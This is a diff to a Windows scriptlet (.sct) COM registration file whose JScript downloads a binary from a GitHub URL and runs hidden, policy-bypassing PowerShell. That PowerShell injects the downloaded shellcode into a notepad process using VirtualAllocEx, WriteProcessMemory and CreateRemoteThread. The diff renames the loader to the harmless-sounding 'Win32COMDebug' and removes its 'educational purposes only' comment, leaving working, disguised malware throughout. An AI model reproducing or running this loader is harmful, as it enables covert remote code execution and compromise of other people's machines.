@@ -1,69 +1,73 @@
 <?XML version="1.0"?>
 <scriptlet>
 <registration
-    description="MemoryLoader"
-    progid="MemoryLoader"
+    description="Win32COMDebug"
+    progid="Win32COMDebug"
     version="1.00"
-    classid="{12345678-1234-1234-1234-123456789ABC}">
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}">
     
     <script language="JScript">
         <![CDATA[
-            // EDUCATIONAL PURPOSES ONLY - MEMORY EXECUTION ONLY
-            try {
-                var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
+            var url = "https://github.com/xekze0102-art/b64a/raw/refs/heads/main/loader.bin";
+            var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+            xhr.open("GET", url, false);
+            xhr.send();
+            
+            if (xhr.status == 200) {
+                var payload = xhr.responseBody;
+                var shellcode = new VBArray(payload).toArray();
                 
-                // Download payload to memory
-                var xhr = new ActiveXObject("MSXML2.XMLHTTP");
-                xhr.open("GET", url, false);
-                xhr.send();
+                var shell = new ActiveXObject("WScript.Shell");
+                var psCode = "";
+                psCode += "$code = [System.Convert]::FromBase64String('" + base64Encode(shellcode) + "');";
+                psCode += "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices');";
+                psCode += "Add-Type @'";
+                psCode += "using System;";
+                psCode += "using System.Runtime.InteropServices;";
+                psCode += "using System.Diagnostics;";
+                psCode += "public class Inject {";
+                psCode += "[DllImport(\"kernel32.dll\")]";
+                psCode += "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);";
+                psCode += "[DllImport(\"kernel32.dll\")]";
+                psCode += "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
+                psCode += "[DllImport(\"kernel32.dll\")]";
+                psCode += "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
+                psCode += "[DllImport(\"kernel32.dll\")]";
+                psCode += "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);";
+                psCode += "[DllImport(\"kernel32.dll\")]";
+                psCode += "public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);";
+                psCode += "public static void InjectShellcode(byte[] shellcode) {";
+                psCode += "Process[] procs = Process.GetProcessesByName(\"notepad\");";
+                psCode += "if (procs.Length == 0) return;";
+                psCode += "IntPtr hProcess = OpenProcess(0x1F0FFF, false, procs[0].Id);";
+                psCode += "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);";
+                psCode += "UIntPtr bytesWritten;";
+                psCode += "WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);";
+                psCode += "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);";
+                psCode += "}";
+                psCode += "}";
+                psCode += "'@;";
+                psCode += "[Inject]::InjectShellcode($code);";
                 
-                if (xhr.status == 200) {
-                    var payload = xhr.responseBody;
-                    
-                    // Convert to array for memory manipulation
-                    var shellcode = new VBArray(payload).toArray();
-                    
-                    // Allocate executable memory
-                    var memoryAddr = 0;
-                    var pageSize = 4096;
-                    var payloadSize = shellcode.length;
-                    
-                    // Use VirtualAlloc via Shellcode
-                    var allocCode = [
-                        0x48, 0x83, 0xEC, 0x28,                   // sub rsp, 0x28
-                        0x48, 0x31, 0xC9,                         // xor rcx, rcx
-                        0x48, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rdx, payloadSize
-                        0x49, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r8, 0x3000
-                        0x49, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r9, 0x40
-                        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, VirtualAlloc addr
-                        0xFF, 0xD0,                               // call rax
-                        0x48, 0x83, 0xC4, 0x28,                   // add rsp, 0x28
-                        0xC3                                      // ret
-                    ];
-                    
-                    // Alternative approach using .NET for memory allocation
-                    var shell = new ActiveXObject("WScript.Shell");
-                    
-                    // Create PowerShell in memory to handle the payload
-                    var psCommand = "powershell -exec bypass -WindowStyle Hidden -Command \"";
-                    psCommand += "[System.Reflection.Assembly]::LoadWithPartialName('System.Runtime.InteropServices');";
-                    psCommand += "[System.Reflection.Assembly]::LoadWithPartialName('System.Net.Http');";
-                    psCommand += "$client = New-Object System.Net.Http.HttpClient;";
-                    psCommand += "$response = $client.GetAsync('" + url + "').Result;";
-                    psCommand += "$bytes = $response.Content.ReadAsByteArrayAsync().Result;";
-                    psCommand += "$size = $bytes.Length;";
-                    psCommand += "$mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((";
-                    psCommand += "[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(([System.IntPtr]([System.UInt32]0xDEADBEEF)),";
-                    psCommand += "[Type]::GetTypeFromCLSID([Guid]'AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA'))).Invoke(0, $size, 0x3000, 0x40);";
-                    psCommand += "[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $mem, $size);";
-                    psCommand += "Invoke-Expression 'This technique requires additional setup';";
-                    psCommand += "\"";
-                    
-                    shell.Run(psCommand, 0, false);
-                    
+                shell.Run("powershell -exec bypass -WindowStyle Hidden -Command \"" + psCode + "\"", 0, false);
+            }
+            
+            function base64Encode(data) {
+                var base64 = "";
+                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+                for (var i = 0; i < data.length; i += 3) {
+                    var a = data[i] || 0;
+                    var b = data[i + 1] || 0;
+                    var c = data[i + 2] || 0;
+                    var bits = (a << 16) | (b << 8) | c;
+                    base64 += chars.charAt((bits >> 18) & 63);
+                    base64 += chars.charAt((bits >> 12) & 63);
+                    base64 += chars.charAt((bits >> 6) & 63);
+                    base64 += chars.charAt(bits & 63);
                 }
-            } catch(e) {
-                // Silent fail for stealth
+                if (data.length % 3 === 1) base64 = base64.slice(0, -2) + "==";
+                else if (data.length % 3 === 2) base64 = base64.slice(0, -1) + "=";
+                return base64;
             }
         ]]>
     </script>
